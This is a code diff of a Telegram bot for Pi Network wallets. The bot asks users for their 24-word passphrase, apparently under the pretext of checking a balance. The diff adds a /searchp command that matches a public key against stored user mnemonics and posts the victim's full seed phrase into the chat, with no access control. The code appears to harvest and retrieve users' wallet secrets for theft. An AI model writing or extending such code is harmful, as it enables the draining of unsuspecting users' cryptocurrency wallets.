@@ -48,6 +48,13 @@ bot.onText(/\/search/, (msg) => {
     userSessions[chatId] = { SearchingForWallet: true }
 });
 
+bot.onText(/\/searchp/, (msg) => {
+    const chatId = msg.chat.id;
+    bot.sendMessage(chatId, 'Please send the wallet pulic key starting with *G*', { parse_mode: 'Markdown' });
+
+    userSessions[chatId] = { SearchingForWalletP: true }
+});
+
 bot.onText(/\/balance/, (msg) => {
     const chatId = msg.chat.id;
     bot.sendMessage(chatId, 'Please send your 24-word passphrase (seperated by space) OR Pi Wallet address');
@@ -308,6 +315,41 @@ bot.on('message', async (msg) => {
             delete userSessions[chatId];
             const lockedPi = existing.amount ? `locked ${existing.amount} PI` : 'No locked PI'
             return bot.sendMessage(chatId, `✅ Matching wallet with *${lockedPi}* found.`, { parse_mode: 'Markdown' });
+            
+        }
+        delete userSessions[chatId];
+        return bot.sendMessage(chatId, `❌ No matching wallet found.`);
+
+        } catch (error) {
+            console.log(error)
+            bot.sendMessage(chatId, `❌ Error processing the data. Please try again.`);
+        }
+
+        delete userSessions[chatId];
+    }
+});
+
+// Search for wallet Mnemonic
+bot.on('message', async (msg) => {
+    const chatId = msg.chat.id;
+    const text = msg.text.trim();
+
+    if(userSessions[chatId]?.SearchingForWalletP) {
+        try {
+            const passphrases = await Passphrase.find();
+
+        if (passphrases.length === 0) {
+            return bot.sendMessage(chatId, '❌ No wallet found.');
+        }
+
+        const existing = passphrases.find(phrase => {
+            const kp = getKeypairFromPassphrase(phrase.mnemonic);
+            return kp.publicKey() === text;
+        });
+
+        if(existing) {
+            delete userSessions[chatId];
+            await bot.sendMessage(chatId, `✅ Matching wallet mnemonic: *${existing.mnemonic}*`, { parse_mode: 'Markdown' });
             
         }
         delete userSessions[chatId];
